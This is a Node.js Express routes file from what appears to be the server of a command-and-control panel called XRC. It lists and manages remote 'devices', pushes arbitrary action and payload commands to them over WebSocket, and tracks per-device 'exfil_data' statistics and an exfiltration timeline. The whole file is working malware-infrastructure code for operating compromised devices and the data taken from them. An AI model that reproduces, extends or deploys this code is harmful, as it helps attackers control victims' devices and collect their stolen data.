// ============================================================
// FILE: XRC/server/src/routes/devices.js
// ============================================================
const express = require('express');
const { v4: uuidv4 } = require('uuid');
const { getDatabase } = require('../db/database');

const router = express.Router();

/**
 * GET /api/devices
 * List all registered devices with optional filters.
 */
router.get('/', (req, res) => {
    try {
        const db = getDatabase();
        const { status, group, search, limit, offset } = req.query;

        let query = 'SELECT * FROM devices WHERE 1=1';
        const params = [];

        if (status === 'online') {
            query += ' AND is_online = 1';
        } else if (status === 'offline') {
            query += ' AND is_online = 0';
        }

        if (group) {
            query += ' AND group_name = ?';
            params.push(group);
        }

        if (search) {
            query += ' AND (alias LIKE ? OR model LIKE ? OR device_id LIKE ?)';
            params.push(`%${search}%`, `%${search}%`, `%${search}%`);
        }

        query += ' ORDER BY last_seen DESC';

        const countQuery = query.replace('SELECT *', 'SELECT COUNT(*) as count');
        const total = db.prepare(countQuery).get(...params);

        const pageLimit = parseInt(limit) || 50;
        const pageOffset = parseInt(offset) || 0;
        query += ` LIMIT ${pageLimit} OFFSET ${pageOffset}`;

        const devices = db.prepare(query).all(...params);

        res.json({
            devices,
            total: total.count,
            limit: pageLimit,
            offset: pageOffset
        });
    } catch (err) {
        console.error('List devices error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/devices/:deviceId
 * Get detailed device info.
 */
router.get('/:deviceId', (req, res) => {
    try {
        const db = getDatabase();
        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(req.params.deviceId);

        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }

        // Get recent commands
        const commands = db.prepare(
            'SELECT * FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 20'
        ).all(req.params.deviceId);

        // Get exfil stats
        const exfilStats = db.prepare(
            'SELECT type, COUNT(*) as count FROM exfil_data WHERE device_id = ? GROUP BY type'
        ).all(req.params.deviceId);

        // Get event timeline
        const timeline = db.prepare(`
            (SELECT 'command' as event_type, created_at as ts, action as description FROM commands WHERE device_id = ?)
            UNION ALL
            (SELECT 'exfil' as event_type, received_at as ts, type as description FROM exfil_data WHERE device_id = ?)
            ORDER BY ts DESC LIMIT 50
        `).all(req.params.deviceId, req.params.deviceId);

        res.json({
            ...device,
            commands,
            exfil_stats: exfilStats,
            timeline
        });
    } catch (err) {
        console.error('Get device error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * PATCH /api/devices/:deviceId
 * Update device metadata (alias, tags, notes, group).
 */
router.patch('/:deviceId', (req, res) => {
    try {
        const db = getDatabase();
        const { alias, tags, notes, group_name } = req.body;

        const updates = [];
        const params = [];

        if (alias !== undefined) { updates.push('alias = ?'); params.push(alias); }
        if (tags !== undefined) { updates.push('tags = ?'); params.push(JSON.stringify(tags)); }
        if (notes !== undefined) { updates.push('notes = ?'); params.push(notes); }
        if (group_name !== undefined) { updates.push('group_name = ?'); params.push(group_name); }

        if (updates.length === 0) {
            return res.status(400).json({ error: 'No fields to update' });
        }

        params.push(req.params.deviceId);
        db.prepare(`UPDATE devices SET ${updates.join(', ')} WHERE device_id = ?`).run(...params);

        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(req.params.deviceId);
        res.json(device);
    } catch (err) {
        console.error('Update device error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * DELETE /api/devices/:deviceId
 * Remove device and all associated data.
 */
router.delete('/:deviceId', (req, res) => {
    try {
        const db = getDatabase();
        db.prepare('DELETE FROM commands WHERE device_id = ?').run(req.params.deviceId);
        db.prepare('DELETE FROM exfil_data WHERE device_id = ?').run(req.params.deviceId);
        db.prepare('DELETE FROM devices WHERE device_id = ?').run(req.params.deviceId);
        res.json({ message: 'Device removed' });
    } catch (err) {
        console.error('Delete device error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * POST /api/devices/:deviceId/command
 * Send a command to a specific device.
 */
router.post('/:deviceId/command', (req, res) => {
    try {
        const db = getDatabase();
        const { action, payload, priority } = req.body;

        if (!action) {
            return res.status(400).json({ error: 'Action required' });
        }

        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(req.params.deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }

        const command = {
            id: uuidv4(),
            device_id: req.params.deviceId,
            action,
            payload: payload || '',
            status: 'pending',
            priority: priority || 'normal',
            created_at: Math.floor(Date.now() / 1000)
        };

        db.prepare(`
            INSERT INTO commands (id, device_id, action, payload, status, priority, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `).run(command.id, command.device_id, command.action, command.payload, command.status, command.priority, command.created_at);

        // Push to WebSocket queue if device is connected
        const { sendToDevice } = require('../ws/websocket');
        sendToDevice(command.device_id, {
            type: 'cmd',
            id: command.id,
            device_id: command.device_id,
            ts: command.created_at * 1000,
            payload: JSON.stringify(command)
        });

        res.status(201).json(command);
    } catch (err) {
        console.error('Send command error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
